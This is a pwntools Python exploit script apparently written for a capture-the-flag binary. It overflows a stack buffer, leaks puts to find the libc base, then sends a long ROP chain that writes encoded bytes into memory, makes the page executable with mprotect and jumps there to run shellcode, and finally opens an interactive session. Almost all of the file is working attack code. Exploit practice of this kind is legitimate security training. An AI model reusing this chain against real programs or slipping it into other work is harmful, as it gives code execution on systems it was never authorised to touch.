#!/usr/bin/env python3
from pwn import *

"""

"""
context.terminal = ["tmux", "new-window"]

bin = ELF("./chall_patched",checksec=False)
libc = ELF("./libc.so.6",checksec=False)

context.binary = bin

def conn():
    if args.GDB:
        io = gdb.debug([bin.path], gdbscript='''
        b*vuln+107
        c
        ''')
    elif args.REMOTE:
        io = remote("", )
    else:
        io = process([bin.path])
    return io

def main(io):
    
    pld = b"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xc3\x12\x40\x00\x00\x00\x00\x00\x18\x40\x40\x00\x00\x00\x00\x00\x64\x10\x40\x00\x00\x00\x00\x00\x29\x12\x40\x00\x00\x00\x00\x00"

    io.sendlineafter(b"Please leave a comment: \n",pld)

    print(hex(libc.symbols['puts'] ))

    leak = u64((io.recv(6).ljust(8, b'\x00')))
    info("Leaked libc address,  puts: "+ hex(leak))
    libc.address = leak - libc.symbols['puts'] 
    info("libc base @ %s" % hex(libc.address))

    pld2 = b"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
    pld2 += p64(libc.address + 0x36174)+ p64(0x40427f)+ p64(0x4012c3)+ p64(0x4fc93f6b)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x404283)+ p64(0x4012c3)+ p64(0xc632e4d2)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x404287)+ p64(0x4012c3)+ p64(0x48a292f0)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x40428b)+ p64(0x4012c3)+ p64(0x90a7e216)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x40428f)+ p64(0x4012c3)+ p64(0xfbc066b7)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x404293)+ p64(0x4012c3)+ p64(0x7718e6cd)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x404297)+ p64(0x4012c3)+ p64(0x5dbb1ced)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x40429b)+ p64(0x4012c3)+ p64(0xbde5eaa5)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x40429f)+ p64(0x4012c3)+ p64(0x725444b0)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x4042a3)+ p64(0x4012c3)+ p64(0xaddbb151)+ p64(libc.address + 0xec3f0)
    pld2 += p64(libc.address + 0x36174)+ p64(0x4042a7)+ p64(0x4012c3)+ p64(0xf61cc31e)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x4042ab)+ p64(0x4012c3)+ p64(0xb750d43a)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x4042af)+ p64(0x4012c3)+ p64(0xac1c85a8)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x4042b3)+ p64(0x4012c3)+ p64(0x92740328)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x4042b7)+ p64(0x4012c3)+ p64(0x68f79923)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x4042bb)+ p64(0x4012c3)+ p64(0x89a10053)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x4042bf)+ p64(0x4012c3)+ p64(0x82e9155f)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x4042c3)+ p64(0x4012c3)+ p64(0xfed836f7)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x4042c7)+ p64(0x4012c3)+ p64(0xf1867004)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x4042cb)+ p64(0x4012c3)+ p64(0xb99ef772)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x4042cf)+ p64(0x4012c3)+ p64(0x1ae6ba20)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x4042d3)+ p64(0x4012c3)+ p64(0xab2fe93d)+ p64(libc.address + 0xec3f0)
    pld2 += p64(libc.address + 0x36174)+ p64(0x4042d7)+ p64(0x4012c3)+ p64(0x80840ec5)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x4042db)+ p64(0x4012c3)+ p64(0x6669ab2f)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x4042df)+ p64(0x4012c3)+ p64(0xd71f2616)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x4042e3)+ p64(0x4012c3)+ p64(0x5f41f148)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x4042e7)+ p64(0x4012c3)+ p64(0xf36a5bcb)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x4042eb)+ p64(0x4012c3)+ p64(0x3ae3fcc2)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x4042ef)+ p64(0x4012c3)+ p64(0x2082ee28)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x4042f3)+ p64(0x4012c3)+ p64(0xed946b42)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x4042f7)+ p64(0x4012c3)+ p64(0x39268fc)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x36174)+ p64(0x4042f7)+ p64(libc.address + 0x10257e)+ p64(0x7e816380)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x4042fb)+ p64(libc.address + 0x10257e)+ p64(0x4e72bb24)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x4042ff)+ p64(libc.address + 0x10257e)+ p64(0xc1eb9a87)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x404303)+ p64(libc.address + 0x10257e)+ p64(0xc8a588ef)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x404307)+ p64(libc.address + 0x10257e)+ p64(0x728963b8)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x40430b)+ p64(libc.address + 0x10257e)+ p64(0x3f8eae0d)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x40430f)+ p64(libc.address + 0x10257e)+ p64(0x1d09decc)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x404313)+ p64(libc.address + 0x10257e)+ p64(0x999167ed)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x404317)+ p64(libc.address + 0x10257e)+ p64(0xb5dd0870)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x40431b)+ p64(libc.address + 0x10257e)+ p64(0x2492b45e)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x40431f)+ p64(libc.address + 0x10257e)+ p64(0x362d8bde)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x404323)+ p64(libc.address + 0x10257e)+ p64(0xfe99e572)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x404327)+ p64(libc.address + 0x10257e)+ p64(0xe015dc25)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x40432b)+ p64(libc.address + 0x10257e)+ p64(0x9960b527)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x40432f)+ p64(libc.address + 0x10257e)+ p64(0x6ee3a967)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x404333)+ p64(libc.address + 0x10257e)+ p64(0xfd61391f)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x404337)+ p64(libc.address + 0x10257e)+ p64(0x42165d53)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x40433b)+ p64(libc.address + 0x10257e)+ p64(0xb619bfbf)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x40433f)+ p64(libc.address + 0x10257e)+ p64(0x1a899187)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x404343)+ p64(libc.address + 0x10257e)+ p64(0x7b17bb94)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x404347)+ p64(libc.address + 0x10257e)+ p64(0xaae70d60)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x40434b)+ p64(libc.address + 0x10257e)+ p64(0x1b2ae63c)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x40434f)+ p64(libc.address + 0x10257e)+ p64(0x4f7b46f9)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x404353)+ p64(libc.address + 0x10257e)+ p64(0xf981ae20)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x404357)+ p64(libc.address + 0x10257e)+ p64(0xb1e0d9e9)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x40435b)+ p64(libc.address + 0x10257e)+ p64(0x71269024)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x40435f)+ p64(libc.address + 0x10257e)+ p64(0x8b1e23bf)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x404363)+ p64(libc.address + 0x10257e)+ p64(0x5b5e0b59)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x404367)+ p64(libc.address + 0x10257e)+ p64(0x411555db)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x40436b)+ p64(libc.address + 0x10257e)+ p64(0x7f39488e)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(libc.address + 0x36174)+ p64(0x40436f)+ p64(libc.address + 0x10257e)+ p64(0x59faf94b)+ p64(0xdeadbeef)+ p64(libc.address + 0x6ec67)+ p64(0x4012c3)+ p64(0x404000)+ p64(libc.address + 0x2601f)+ p64(0x1000)+ p64(libc.address + 0x142c92)+ p64(0x7)+ p64(libc.address + 0x1189a0)+ p64(0x404280)
    
    io.sendlineafter(b"Please leave a comment: \n",pld2)

    io.interactive()


if __name__ == "__main__":
    io = conn()
    main(io)
